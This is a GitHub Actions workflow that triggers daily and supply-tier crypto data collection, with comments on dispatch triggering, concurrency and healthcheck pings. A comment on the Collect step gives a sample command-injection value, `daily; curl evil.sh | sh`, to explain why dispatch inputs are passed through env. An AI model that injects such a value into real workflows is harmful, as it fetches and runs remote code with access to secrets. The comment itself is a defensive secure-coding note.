# =============================================================================
# WHY: the daily collection tier. This one workflow is the entire product --
# Layers 1 and 2, the journal and the dashboard are all daily computations.
#
# NOTE THE TRIGGER, AND DO NOT "FIX" IT: workflow_dispatch ONLY.
#
# There is deliberately no `on: schedule:` anywhere in this repository.
# GitHub's schedule event is documented as best-effort: runs commonly fire
# 5-45 minutes late, delays of 8-14 hours occur, days get dropped during
# high-load windows, and there have been platform-wide periods where scheduled
# runs stopped being created at all while workflow_dispatch kept working.
# Self-hosted runners do not help -- the queuing sits on GitHub's side.
#
# Triggering is external, from cron-job.org, which POSTs to
#   /repos/{owner}/{repo}/actions/workflows/collect-daily.yml/dispatches
# and gets a 204 back immediately.
#
# Two bonuses beyond punctuality: the 60-day inactivity auto-disable applies
# only to SCHEDULED workflows, so with none in the repo there is nothing to
# disable and no keepalive workflow is needed; and during a GitHub scheduler
# outage, dispatch keeps working.
#
# Adding `schedule:` here would silently reintroduce both problems while the
# workflow still appears to run. There is a CI guard against it in ci.yml.
# =============================================================================
name: collect-daily

on:
  workflow_dispatch:
    inputs:
      tier:
        description: "Which cadence tier to collect: daily | hourly"
        required: false
        default: "daily"
      scheduled_for:
        description: "Intended fire slot from cron-job.org: \"HH:MM\" daily, \":MM\" hourly, or a UTC ISO instant"
        required: false
        default: ""

# A delayed trigger can land on top of a still-running job. Two collectors
# writing the same snapshot key would contend, so queue rather than cancel:
# the in-flight run holds data that cannot be re-fetched.
concurrency:
  group: collect-daily
  cancel-in-progress: false

permissions:
  contents: read

jobs:
  collect:
    runs-on: ubuntu-latest
    # A hung HTTP call would otherwise hold a runner slot indefinitely.
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: pip

      - run: pip install -r requirements.txt

      # A dispatch input is attacker-controllable text. Interpolated straight
      # into `run:` it is pasted into the shell script BEFORE the shell sees
      # it, so `daily; curl evil.sh | sh` executes as two commands with the
      # job's secrets in scope. Passed through `env:` the value is data the
      # shell reads from the environment, and quoting it keeps it one argument.
      - name: Collect
        run: python -m src.cli collect "$TIER"
        env:
          TIER: ${{ inputs.tier || 'daily' }}
          TURSO_DATABASE_URL: ${{ secrets.TURSO_DATABASE_URL }}
          TURSO_AUTH_TOKEN: ${{ secrets.TURSO_AUTH_TOKEN }}
          COINGECKO_API_KEY: ${{ secrets.COINGECKO_API_KEY }}
          COINALYZE_API_KEY: ${{ secrets.COINALYZE_API_KEY }}
          LUNARCRUSH_API_KEY: ${{ secrets.LUNARCRUSH_API_KEY }}
          CRYPTOPANIC_AUTH_TOKEN: ${{ secrets.CRYPTOPANIC_AUTH_TOKEN }}
          PYTHONIOENCODING: utf-8

      - name: Record trigger lag
        if: always() && inputs.scheduled_for != ''
        run: python -m src.ops.record_lag --workflow collect-daily --scheduled "$SCHEDULED_FOR"
        env:
          SCHEDULED_FOR: ${{ inputs.scheduled_for }}
          TURSO_DATABASE_URL: ${{ secrets.TURSO_DATABASE_URL }}
          TURSO_AUTH_TOKEN: ${{ secrets.TURSO_AUTH_TOKEN }}

      # Ping ONLY on success. cron-job.org already knows the trigger fired and
      # got its 204; it cannot know whether the job then failed. That half of
      # the failure space belongs to healthchecks.io, and pinging on failure
      # would blind it.
      - name: Healthcheck ping
        # The guard is in the SHELL, not in `if:`. A step's own `env:` block is
        # not in scope for that same step's `if` expression -- only workflow-
        # and job-level env is, because those are bound at workflow init and the
        # step's are not. `if: env.HC != ''` therefore compared '' against '',
        # was false on every run, and the step was skipped forever. The failure
        # is invisible from GitHub's side: the job is green and the step reads
        # "skipped", while healthchecks.io says "Last Ping: Never" and looks for
        # all the world like a wrong UUID.
        #
        # Pinging stays conditional on success(). A failed job must send NOTHING:
        # the missed ping is the whole signal, and it is the one failure mode
        # cron-job.org structurally cannot see, having already had its 204.
        if: success()
        env:
          HC: ${{ secrets.HEALTHCHECK_DAILY }}
        run: |
          if [ -z "$HC" ]; then
            echo "::notice::HEALTHCHECK_DAILY is unset; skipping healthcheck ping"
            exit 0
          fi
          curl -fsS -m 10 --retry 3 "https://hc-ping.com/$HC"

      - name: Upload logs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: collect-daily-logs-${{ github.run_id }}
          path: logs/
          retention-days: 14
          if-no-files-found: ignore

  # Holders and unlocks: the supply tier (D-040, D-045).
  #
  # A JOB IN THIS WORKFLOW, not a workflow of its own chained by workflow_run.
  # GitHub runs at most three workflow_run levels after a dispatched workflow,
  # and collect-daily -> screen -> publish -> build-site already uses all three.
  # A fourth link would not error: build-site would simply never run, and the
  # dashboard would sit on stale data looking fine.
  #
  # needs: collect -- the holder and contract collectors read the newest
  # universe_snapshot and market_snapshot, which the collect job has just
  # written. Run before it, a token that entered the universe today would have
  # no reading and fail L1_HOLDER_CONC on its first day.
  #
  # continue-on-error -- a failed or timed-out supply run must not stop the
  # screen. Yesterday's readings still count (D-042), and a second missed day
  # switches the check off loudly (D-007) rather than screening on stale data.
  # The failure stays visible: a red job, and no HEALTHCHECK_SUPPLY ping.
  #
  # Keep these steps in step with collect-supply.yml, the manual path.
  supply:
    needs: collect
    if: (inputs.tier || 'daily') == 'daily'
    continue-on-error: true
    concurrency:
      group: collect-supply
      cancel-in-progress: false
    runs-on: ubuntu-latest
    # ~27 min of GoPlus reads a day (D-044); a cold start adds ~370 DefiLlama
    # protocols. A timeout loses the run's holder data, so the budget is generous.
    timeout-minutes: 90
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: pip

      - run: pip install -r requirements.txt

      # Creates the supply tables on first run and adds any column a later
      # release introduced. Idempotent, and additive only.
      - name: Apply schema
        run: python -m src.cli init-db
        env:
          TURSO_DATABASE_URL: ${{ secrets.TURSO_DATABASE_URL }}
          TURSO_AUTH_TOKEN: ${{ secrets.TURSO_AUTH_TOKEN }}

      - name: Collect supply
        run: python -m src.cli collect supply
        env:
          TURSO_DATABASE_URL: ${{ secrets.TURSO_DATABASE_URL }}
          TURSO_AUTH_TOKEN: ${{ secrets.TURSO_AUTH_TOKEN }}
          PYTHONIOENCODING: utf-8

      # Guarded in the shell, not in `if:` (D-033). On success only: the missed
      # ping is how a failed supply run is seen, since continue-on-error keeps
      # the workflow itself green.
      - name: Healthcheck ping
        if: success()
        env:
          HC: ${{ secrets.HEALTHCHECK_SUPPLY }}
        run: |
          if [ -z "$HC" ]; then
            echo "::notice::HEALTHCHECK_SUPPLY is unset; skipping healthcheck ping"
            exit 0
          fi
          curl -fsS -m 10 --retry 3 "https://hc-ping.com/$HC"

      - name: Upload logs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: collect-supply-logs-${{ github.run_id }}
          path: logs/
          retention-days: 14
          if-no-files-found: ignore
